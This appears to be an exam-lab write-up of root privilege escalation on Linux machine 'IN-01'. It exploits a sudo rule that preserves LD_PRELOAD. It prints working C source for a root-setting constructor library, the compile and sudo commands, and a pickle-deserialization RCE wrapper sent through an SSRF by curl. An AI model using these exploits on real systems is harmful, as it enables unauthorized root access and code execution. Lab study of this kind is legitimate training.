---
type: machine-phase
project: OSCP-Exam-PoC
machine: IN-01
difficulty: Insane
phase: privilege-escalation
status: completed
platform: Linux
initial_user: web
final_user: root
privilege_escalation: Sudo LD_PRELOAD shared-library injection
target_binary: /usr/local/bin/healthcheck
root_flag_status: confirmed-submitted
tags:
  - oscp
  - insane
  - linux
  - privilege-escalation
  - sudo
  - ld-preload
  - shared-library
  - c
  - gcc
root_flag_submitted: true
---

# IN-01 — Root Privilege Escalation

> **Flag completion:** Root flag obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Objective

**Objective:** Escalate privileges from the initial `web` account to root and retrieve `/root/root.txt`.

**Initial execution context:**

```
uid=1000(web) gid=1000(web) groups=1000(web)
```

The initial foothold was established through SSRF and Python Pickle deserialization.

See [[Difficulty Levels/Insane/IN-01/user]] for the complete initial-access chain.

The successful privilege-escalation path was:

<figure class="attack-chain-figure attack-chain-figure--compact">
  <img src="/diagrams/in-01-root-objective-flowchart.svg" alt="Compact eleven-step privilege escalation flowchart with arrows: web UID 1000, sudo enumeration, NOPASSWD healthcheck, preserved LD_PRELOAD, malicious C source, compilation as a shared library, sudo LD_PRELOAD execution, root constructor, captured UID and EUID 0, reading /root/root.txt and root flag retrieval." width="440" height="1191" loading="lazy" decoding="async" />
  <figcaption>All 11 original Objective steps preserved in a compact, arrow-connected flowchart. The captured identity output and flag retrieval confirm root code execution, <strong>not an interactive root shell</strong>.</figcaption>
</figure>

## 2. Initial Privilege-Escalation Context

All privilege-escalation enumeration was performed through the existing in-band command-execution mechanism.

No reverse shell was required.

### 2.1 Confirm Identity

The enumeration output established:

```
uid=1000(web) gid=1000(web) groups=1000(web)
web
insane
/opt/app
```

|Attribute|Value|
|---|---|
|User|`web`|
|UID|`1000`|
|GID|`1000`|
|Hostname|`insane`|
|Working directory|`/opt/app`|

### 2.2 Operating System and Kernel

Command:

```
uname -a
cat /etc/os-release
```

Kernel:

```
Linux insane 6.8.0-147-generic #147-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep 24 11:33:16 UTC 2026 x86_64 GNU/Linux
```

OS release:

```
PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
NAME="Debian GNU/Linux"
VERSION_ID="13"
VERSION="13 (trixie)"
VERSION_CODENAME=trixie
DEBIAN_VERSION_FULL=13.7
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

The kernel string identifies an Ubuntu-built kernel, while `/etc/os-release` identifies Debian GNU/Linux 13.

Both observations are retained as reported.

## 3. Privilege-Escalation Enumeration

### 3.1 Sudo Privileges

Command:

```
sudo -n -l
```

Actual output:

```
Matching Defaults entries for web on insane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty, env_keep+=LD_PRELOAD, !requiretty

User web may run the following commands on insane:
    (root) NOPASSWD: /usr/local/bin/healthcheck
```

This was the critical finding.

Two conditions were present:

1. The `web` account could execute `/usr/local/bin/healthcheck` as root without a password.
    
2. Sudo preserved the `LD_PRELOAD` environment variable.
    

The relevant configuration was:

```
env_keep+=LD_PRELOAD
```

The permitted command was:

```
(root) NOPASSWD: /usr/local/bin/healthcheck
```

Together, these settings provided a potential shared-library injection path.

### 3.2 SUID Enumeration

Command:

```
find / -xdev -type f -perm -4000 -printf "%m %u:%g %p\n" 2>/dev/null
```

Output:

```
4755 root:root /usr/lib/openssh/ssh-keysign
4755 root:root /usr/bin/mount
4755 root:root /usr/bin/newgrp
4755 root:root /usr/bin/chsh
4755 root:root /usr/bin/umount
4755 root:root /usr/bin/su
4755 root:root /usr/bin/chfn
4755 root:root /usr/bin/passwd
4755 root:root /usr/bin/gpasswd
4755 root:root /usr/bin/sudo
```

No unusual SUID binary was identified as a stronger route than the sudo configuration.

### 3.3 SGID Enumeration

Command:

```
find / -xdev -type f -perm -2000 -printf "%m %u:%g %p\n" 2>/dev/null
```

Output:

```
2755 root:shadow /usr/bin/chage
2755 root:shadow /usr/bin/expiry
2755 root:_ssh /usr/bin/ssh-agent
2755 root:shadow /usr/sbin/unix_chkpwd
```

No relevant SGID exploitation path was identified.

### 3.4 Linux Capabilities

Command:

```
getcap -r /usr/bin /usr/sbin /bin /sbin /opt 2>/dev/null
```

Output:

```

```

No capability entries were returned.

### 3.5 Cron Jobs

The enumeration checked:

```
/etc/crontab
/etc/cron.d/*
```

Output:

```

```

No cron entries were returned by that enumeration.

### 3.6 Systemd Timers

Command:

```
systemctl list-timers --all --no-pager
```

Output:

```
System has not been booted with systemd as init system (PID 1). Can't operate.
Failed to connect to system scope bus via local transport: Host is down
```

Systemd timer enumeration was unavailable because systemd was not running as PID 1.

### 3.7 Writable Directories

Command:

```
find / -xdev -type d -writable -printf "%m %u:%g %p\n" 2>/dev/null | head -80
```

Output:

```
1777 root:root /tmp
700 web:web /home/web
700 web:web /home/web/.ssh
755 web:web /opt/app
775 web:web /opt/app/__pycache__
1777 root:root /var/tmp
1777 root:root /run/lock
```

`/tmp` was writable and suitable for storing the source and compiled shared library.

### 3.8 Running Processes

The process enumeration included:

```
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 14:47 ?        00:00:00 su -s /bin/sh web -c cd /opt/app && exec /usr/local/bin/gunicorn --access-logfile - -b 0.0.0.0:8080 public_app:app

root          16       1  0 14:47 ?        00:00:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups

root          17       1  0 14:47 ?        00:00:00 su -s /bin/sh web -c cd /opt/app && exec /usr/local/bin/gunicorn --access-logfile - -b 127.0.0.1:9000 internal_app:app

web           20       1  0 14:47 ?        00:00:02 /usr/local/bin/python3.11 /usr/local/bin/gunicorn --access-logfile - -b 0.0.0.0:8080 public_app:app

web           21      17  0 14:47 ?        00:00:02 /usr/local/bin/python3.11 /usr/local/bin/gunicorn --access-logfile - -b 127.0.0.1:9000 internal_app:app

web           22      20  0 14:47 ?        00:00:46 /usr/local/bin/python3.11 /usr/local/bin/gunicorn --access-logfile - -b 0.0.0.0:8080 public_app:app

web           23      21  0 14:47 ?        00:00:22 /usr/local/bin/python3.11 /usr/local/bin/gunicorn --access-logfile - -b 127.0.0.1:9000 internal_app:app

web           28      1   0 16:04 ?        00:00:00 [bash] <defunct>

web           31      1   0 16:07 ?        00:00:00 [bash] <defunct>
```

The public and internal Gunicorn workers were running under `web`.

### 3.9 Enumeration Decision

The strongest finding was the sudo rule:

```
(root) NOPASSWD: /usr/local/bin/healthcheck
```

combined with:

```
env_keep+=LD_PRELOAD
```

The investigation therefore moved to inspecting the permitted executable and testing whether it could load a user-controlled shared library.

## 4. Inspect the Healthcheck Executable

### 4.1 Target File

```
/usr/local/bin/healthcheck
```

Initial permission inspection:

```
ls -l /usr/local/bin/healthcheck
stat /usr/local/bin/healthcheck
namei -l /usr/local/bin/healthcheck
```

Directory permissions:

```
drwxr-xr-x 1 root root 4096 Oct 27 00:00 /usr/local
drwxr-xr-x 1 root root 4096 Nov  3 15:40 /usr/local/bin
```

Executable:

```
-rwxr-xr-x 1 root root 15960 Nov 3 11:53 /usr/local/bin/healthcheck
```

Relevant metadata:

|Attribute|Value|
|---|---|
|Owner|root|
|Group|root|
|Permissions|`0755`|
|Size|15,960 bytes|
|Type|Regular file|
|Links|1|
|Device|`0,67`|
|Inode|`2677114`|
|Access|2026-11-03 11:53:48 UTC|
|Modify|2026-11-03 11:53:48 UTC|
|Change|2026-11-03 11:54:41 UTC|
|Birth|2026-11-03 11:54:41 UTC|

The executable and its parent directories were root-owned. Direct replacement by `web` was not the selected route.

### 4.2 File Utility Unavailable

The target did not have the `file` utility:

```
/bin/sh: 19: file: not found
```

Instead, the binary was inspected using `strings`.

Command:

```
strings -a /usr/local/bin/healthcheck | head -100
```

Relevant output:

```
/lib64/ld-linux-x86-64.so.2
puts
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
healthcheck: all services ok
GCC: (Debian 14.2.0-19) 14.2.0
healthcheck.c
```

Additional ELF-related symbols and sections included:

```
main
.symtab
.strtab
.shstrtab
.interp
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.dynamic
.got.plt
.data
.bss
```

These findings indicated a dynamically linked ELF executable using the system dynamic loader and libc.

The embedded source filename was:

```
healthcheck.c
```

The normal healthcheck output string was:

```
healthcheck: all services ok
```

The original C source was not recovered from the target. The binary was inspected through metadata and embedded strings.

### 4.3 Related Executables

The `/usr/local/bin/` directory contained:

```
entrypoint.sh
flask
gunicorn
healthcheck
python3.11
```

Along with Python utility scripts and symbolic links.

### 4.4 Compiler Availability

The target had the required development tools:

|Tool|Location|
|---|---|
|GCC|`/usr/bin/gcc`|
|C compiler|`/usr/bin/cc`|
|ReadELF|`/usr/bin/readelf`|

This allowed the shared library to be compiled on the target itself.

## 5. Why LD_PRELOAD Was the Selected Route

The evidence established the following conditions:

|Requirement|Evidence|Result|
|---|---|---|
|A permitted root command exists|`NOPASSWD: /usr/local/bin/healthcheck`|Confirmed|
|Sudo preserves `LD_PRELOAD`|`env_keep+=LD_PRELOAD`|Confirmed|
|Target executable is dynamically linked|Dynamic loader and libc references|Confirmed|
|A writable payload location exists|`/tmp` is world-writable|Confirmed|
|Compiler is available|`/usr/bin/gcc`|Confirmed|

The intended exploitation mechanism was shared-library injection.

When the permitted executable is launched, the dynamic loader processes libraries specified through `LD_PRELOAD`. Because sudo was configured to preserve this variable, a library controlled by `web` could be loaded during the privileged execution.

A shared-library constructor provides code that executes when the library is loaded.

The selected proof was to:

1. Create a C source file in `/tmp`.
    
2. Define a constructor.
    
3. Report the process UID and effective UID.
    
4. Read `/root/root.txt`.
    
5. Compile the source into a shared object.
    
6. Execute the permitted healthcheck binary through sudo with `LD_PRELOAD`.
    

## 6. Exploitation — Build the Shared Library

### 6.1 C Source File

The source file was created at:

```
/tmp/in01_preload.c
```

Exact source:

```
#define _GNU_SOURCE

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/types.h>

__attribute__((constructor))
static void preload_init(void)
{
    setgid(0);
    setuid(0);

    dprintf(STDOUT_FILENO,
        "[+] LD_PRELOAD constructor executed\n"
        "[+] UID=%d EUID=%d GID=%d EGID=%d\n",
        getuid(), geteuid(), getgid(), getegid());

    int fd = open("/root/root.txt", O_RDONLY);

    if (fd < 0) {
        perror("open /root/root.txt");
        return;
    }

    dprintf(STDOUT_FILENO, "\n[+] ROOT FLAG:\n");

    char buffer[4096];
    ssize_t count;

    while ((count = read(fd, buffer, sizeof(buffer))) > 0) {
        ssize_t offset = 0;

        while (offset < count) {
            ssize_t written = write(
                STDOUT_FILENO,
                buffer + offset,
                count - offset
            );

            if (written <= 0) {
                close(fd);
                return;
            }

            offset += written;
        }
    }

    close(fd);
}
```

The constructor:

- Executes automatically when the shared library is loaded.
    
- Sets the group and user IDs to zero.
    
- Prints UID, EUID, GID, and EGID.
    
- Opens `/root/root.txt`.
    
- Reads the file and writes its contents to standard output.
    

### 6.2 Compile the Shared Library

The C source was compiled into:

```
/tmp/in01_preload.so
```

Command:

```
/usr/bin/gcc -Wall -Wextra -fPIC -shared \
    -o /tmp/in01_preload.so \
    /tmp/in01_preload.c
```

Relevant compiler options:

|Option|Purpose|
|---|---|
|`-Wall`|Enable common compiler warnings|
|`-Wextra`|Enable additional warnings|
|`-fPIC`|Generate position-independent code|
|`-shared`|Produce a shared library|
|`-o`|Set the output filename|

The resulting shared library was:

```
-rwxrwxr-x 1 web web 15944 Nov 5 16:46 /tmp/in01_preload.so
```

**Result:** Compilation succeeded.

The source and compiled library were owned by `web`, as expected.

## 7. Execute the Shared Library Through Sudo

The permitted root command was:

```
sudo -n LD_PRELOAD=/tmp/in01_preload.so \
    /usr/local/bin/healthcheck
```

The complete operation was executed remotely through the already-established Pickle RCE mechanism.

### 7.1 Complete Successful Execution Wrapper

The following is the successful execution structure used in the examination. It packages the C source creation, compilation, and privileged execution into the remote command, then sends that command through the internal API.

```
REMOTE_CMD=$(cat <<'REMOTE'
set -e

cat > /tmp/in01_preload.c <<'C'
#define _GNU_SOURCE

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/types.h>

__attribute__((constructor))
static void preload_init(void)
{
    setgid(0);
    setuid(0);

    dprintf(STDOUT_FILENO,
        "[+] LD_PRELOAD constructor executed\n"
        "[+] UID=%d EUID=%d GID=%d EGID=%d\n",
        getuid(), geteuid(), getgid(), getegid());

    int fd = open("/root/root.txt", O_RDONLY);

    if (fd < 0) {
        perror("open /root/root.txt");
        return;
    }

    dprintf(STDOUT_FILENO, "\n[+] ROOT FLAG:\n");

    char buffer[4096];
    ssize_t count;

    while ((count = read(fd, buffer, sizeof(buffer))) > 0) {
        ssize_t offset = 0;

        while (offset < count) {
            ssize_t written = write(
                STDOUT_FILENO,
                buffer + offset,
                count - offset
            );

            if (written <= 0) {
                close(fd);
                return;
            }

            offset += written;
        }
    }

    close(fd);
}
C

echo "[+] Compiling shared library"

/usr/bin/gcc -Wall -Wextra -fPIC -shared \
    -o /tmp/in01_preload.so \
    /tmp/in01_preload.c

echo "[+] Shared library compiled"
ls -l /tmp/in01_preload.so

echo "[+] Executing permitted binary through sudo"

sudo -n LD_PRELOAD=/tmp/in01_preload.so \
    /usr/local/bin/healthcheck

REMOTE
)

DATA=$(REMOTE_CMD="$REMOTE_CMD" python3 - <<'PY'
import os
import base64
import pickle

class Exploit:
    def __reduce__(self):
        command = os.environ["REMOTE_CMD"]

        expression = (
            "__import__('subprocess').run("
            + repr(command)
            + ", shell=True, stdout=-1, stderr=-2, "
              "text=True, errors='replace').stdout"
        )

        return eval, (expression,)

print(base64.b64encode(
    pickle.dumps(Exploit(), protocol=4)
).decode())
PY
)

ENC_DATA=$(DATA="$DATA" python3 -c '
import os
from urllib.parse import quote
print(quote(os.environ["DATA"], safe=""))
')

curl -sS --max-time 25 -G \
    --data-urlencode \
    "url=http://127.1:9000/admin/exec?data=$ENC_DATA" \
    'http://x.x.x.x:PORT_J/fetch'
```

The outer Pickle RCE mechanism was already confirmed during initial access. This command reused it to perform the local privilege-escalation operation.

The nested Base64 value was URL-encoded separately before the internal URL was passed through the public `/fetch` parameter.

### 7.2 Actual Execution Output

The following output was observed:

```
[+] Compiling shared library
[+] Shared library compiled
-rwxrwxr-x 1 web web 15944 Nov 5 16:46 /tmp/in01_preload.so
[+] Executing permitted binary through sudo
[+] LD_PRELOAD constructor executed
[+] UID=0 EUID=0 GID=0 EGID=0

[+] ROOT FLAG:
IT{FLAG-SECRET}
healthcheck: all services ok
```

This output confirms:

- GCC successfully compiled the shared library.
    
- The permitted healthcheck executable ran through sudo.
    
- The shared-library constructor executed.
    
- The constructor ran with UID 0 and EUID 0.
    
- The constructor successfully read `/root/root.txt`.
    
- The healthcheck executable continued and printed its normal output.
    

<badge color="success">Root execution confirmed</badge>

## 8. Root Flag

Retrieved value:

```
IT{FLAG-SECRET}
```

The flag was returned directly through the in-band HTTP execution response.

**Root objective: completed.**

## 9. Attack Chain Summary

<figure class="attack-chain-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/in-01-root-attack-chain-mobile.svg" />
    <img src="/diagrams/in-01-root-attack-chain.svg" alt="Detailed thirteen-step IN-01 root attack chain: web foothold, sudo enumeration, NOPASSWD healthcheck, env_keep LD_PRELOAD, root-owned healthcheck and dynamically linked ELF inspection, GCC detection, /tmp/in01_preload.c source creation, compilation to /tmp/in01_preload.so, sudo -n LD_PRELOAD=/tmp/in01_preload.so /usr/local/bin/healthcheck, captured root UID and EUID, root.txt retrieval and flag completion." width="760" height="2338" loading="lazy" decoding="async" />
  </picture>
  <figcaption>All 13 original stages remain in order, with technical context for the <code>sudo</code> permission, ELF loader and shared-library constructor. The source records <code>UID=0 EUID=0 GID=0 EGID=0</code> and the root flag in the HTTP response; no interactive root shell or temporary-file cleanup was verified.</figcaption>
</figure>

## 10. Difficulties Encountered

### 10.1 Initial Binary Inspection Error

The first inspection attempted to use:

```
file /usr/local/bin/healthcheck
sed -n '1,220p' /usr/local/bin/healthcheck
```

The `file` utility was unavailable.

The healthcheck executable was a binary, so attempting to return its raw contents through the HTTP command-output mechanism caused a decoding failure:

```
error: 'utf-8' codec can't decode byte 0x98 in position 812: invalid start byte
```

**Resolution:** Switched to text-oriented inspection:

```
strings -a /usr/local/bin/healthcheck | head -100
```

The dynamic linker references, libc symbols, ELF sections, and embedded strings were sufficient to identify the executable as a dynamically linked ELF binary.

### 10.2 Unnecessary Base64 Output Wrapping

An attempted output-encoding workaround introduced another problem.

The response was not exclusively Base64, so the local decoder returned:

```
base64: invalid input
```

**Resolution:** The raw HTTP response was inspected without assuming that the response body consisted solely of encoded output.

The successful escalation command eventually used text output with replacement handling:

```
text=True, errors='replace'
```

This was sufficient for the compiler and execution output.

### 10.3 Minimal Target Environment

The target did not have every expected diagnostic utility.

In particular, `file` was unavailable.

However, the target did have:

```
/usr/bin/gcc
/usr/bin/cc
/usr/bin/readelf
```

No package installation was required.

### 10.4 No Interactive Root Shell

The successful exploitation did not establish an interactive root shell.

Instead, the shared-library constructor executed in the privileged healthcheck process and directly read `/root/root.txt`.

This was sufficient to prove root-level code execution and complete the required root objective.

## 11. Evidence Registry

|Evidence ID|Description|Result|
|---|---|---|
|IN01-R01|Initial identity|`web`, UID 1000|
|IN01-R02|OS and kernel|Debian 13, kernel 6.8.0-147-generic|
|IN01-R03|SUID enumeration|Standard system binaries|
|IN01-R04|SGID enumeration|Standard system binaries|
|IN01-R05|Capability enumeration|No entries returned|
|IN01-R06|Cron enumeration|No entries returned|
|IN01-R07|Systemd timer check|systemd unavailable as PID 1|
|IN01-R08|Writable directory enumeration|`/tmp` world-writable|
|IN01-R09|Sudo rule|NOPASSWD healthcheck|
|IN01-R10|Sudo environment|`env_keep+=LD_PRELOAD`|
|IN01-R11|Healthcheck permissions|Root-owned, mode 0755|
|IN01-R12|Healthcheck binary inspection|Dynamically linked ELF indicated|
|IN01-R13|Compiler availability|GCC, cc, readelf|
|IN01-R14|Shared-library compilation|Successful|
|IN01-R15|Constructor execution|Confirmed|
|IN01-R16|Root identity|UID 0, EUID 0|
|IN01-R17|Root flag|Retrieved and preserved|

## 12. Lessons Learned

1. **Prioritize sudo misconfigurations.** A single permitted root command can expose a more direct escalation path than broad SUID or cron enumeration.
    
2. **Inspect sudo environment handling.** Variables preserved through sudo can materially change the security of a privileged execution.
    
3. **Verify the target executable.** The dynamic-linker and libc references supported the shared-library injection hypothesis.
    
4. **Use the target's available toolchain.** GCC was already installed, so the shared library could be built locally on the target.
    
5. **Write C source before compiling the** `**.so**`**.** The source file made the constructor logic explicit and reproducible.
    
6. **Use a constructor as an execution proof.** Its output established that the library loaded and executed in the privileged process.
    
7. **Verify privilege level directly.** The output showed `UID=0 EUID=0 GID=0 EGID=0`.
    
8. **Do not confuse root code execution with an interactive shell.** The constructor provided sufficient root-level access to retrieve the flag.
    
9. **Do not treat tooling failures as exploit failures.** The UTF-8 and Base64 problems affected evidence handling, not the underlying sudo misconfiguration.
    
10. **Preserve the actual execution output.** The final constructor output and root flag provide direct confirmation of the completed objective.
    

## 13. Cleanup Status

The examination record confirms creation of:

```
/tmp/in01_preload.c
/tmp/in01_preload.so
```

It does not contain confirmation that these files were removed.

Therefore, cleanup is **not confirmed** and must not be marked as completed.

## 14. Final Result

|Objective|Status|
|---|---|
|Enumerate local privilege-escalation opportunities|Completed|
|Identify sudo misconfiguration|Confirmed|
|Identify preserved `LD_PRELOAD`|Confirmed|
|Inspect permitted executable|Completed|
|Create C shared-library payload|Completed|
|Compile `.so`|Successful|
|Execute constructor through sudo|Successful|
|Verify UID/EUID 0|Confirmed|
|Retrieve `/root/root.txt`|Successful|
|Preserve exact root flag|Completed|
|Cleanup temporary files|Not confirmed|

<badge color="success">IN-01 — ROOT OBJECTIVE COMPLETED</badge>

**Root flag:**

```
IT{FLAG-SECRET}
```

---

## 15. Related Documentation

### Machine Records

- [[IN-01 Overview]]
    
- [[Difficulty Levels/Insane/IN-01/user]]
    

### Exam Context

- [[Dashboard]]
    
- [[Exam Context/Exam Overview]]
    
- [[Exam Context/Lab Environment]]
    
- [[Exam Context/Exam Timeline]]
    

### Reusable PoCs

- [[Reusable PoCs/Linux Privilege Escalation/LD_PRELOAD]]
    

### Difficulties and Lessons

- [[HTTP Client and Connectivity Failures]]
    
- [[Difficulties & Lessons/Tooling and Workflow Mistakes]]